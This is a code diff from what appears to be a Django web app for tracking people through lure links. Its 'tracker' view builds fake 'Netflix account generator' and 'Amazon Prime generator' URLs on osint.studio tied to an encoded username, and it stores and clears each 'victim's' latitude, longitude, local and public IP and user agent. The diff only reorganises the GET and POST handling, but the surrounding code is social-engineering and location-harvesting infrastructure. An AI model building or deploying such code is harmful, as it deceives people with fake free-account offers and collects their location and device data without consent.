@@ -666,41 +666,26 @@ def meme(request,template,username):
         pass
 
     user.profile.save()
-    return render(request, 'meme'+secret[-1]+'.html')
+    return render(request, 'meme'+secret+'.html')
 
 def tracker(request):
 
   if request.method == 'GET':
-    GET = {
-		"request_type" : 'GET'
-	  }
-    return render(request, 'tracker.html',{'get':GET})
 
-  if request.method == 'POST':
     username = request.user.username
     user = User.objects.filter(username=username).first()
-    try:
-      if request.POST['flush'] == "Confirm":
-        user.profile.victimlatitude=""
-        user.profile.victimlocip=""
-        user.profile.victimpublicip=""
-        user.profile.victimlongitude=""
-        user.profile.victimuseragent = ""
-        user.save()
-        return redirect("tracker")
-      else:
-        pass
-    except:
-      pass
-    secret="".join(["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c)+13)%36] for c in str(username+request.POST['template'])])
+    
+    secret="".join(["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c)+13)%36] for c in str(username)])
     secret=base64.b64encode(str(secret).encode('ascii'))
     if "=" in str(secret.decode('ascii')):
           secret=str(secret.decode('ascii')).replace('=','a')
-    #print(request.POST)
-    if request.POST['template']=='1':
-      url = "https://osint.studio/netflixaccountgenerator/" + str(secret)
-    else:
-      url = "https://osint.studio/amazonprimegenerator/" + str(secret)
+
+    url = {}
+
+    url['1'] = "https://osint.studio/amazonprimegenerator/" + str(secret)
+
+    url['2'] = "https://osint.studio/netflixaccountgenerator/" + str(secret)
+  
 
     # Fetching values from DB as list
     
@@ -727,6 +712,26 @@ def tracker(request):
       return render(request, 'tracker.html', {'victim':victim,'url':url})
     else:
       return render(request, 'tracker.html', {'url':url})
+
+
+
+  if request.method == 'POST':
+    username = request.user.username
+    user = User.objects.filter(username=username).first()
+    try:
+      if request.POST['flush'] == "Confirm":
+        user.profile.victimlatitude=""
+        user.profile.victimlocip=""
+        user.profile.victimpublicip=""
+        user.profile.victimlongitude=""
+        user.profile.victimuseragent = ""
+        user.save()
+        return redirect("tracker")
+      else:
+        pass
+    except:
+      pass
+    
 
 def change_password(request):
   
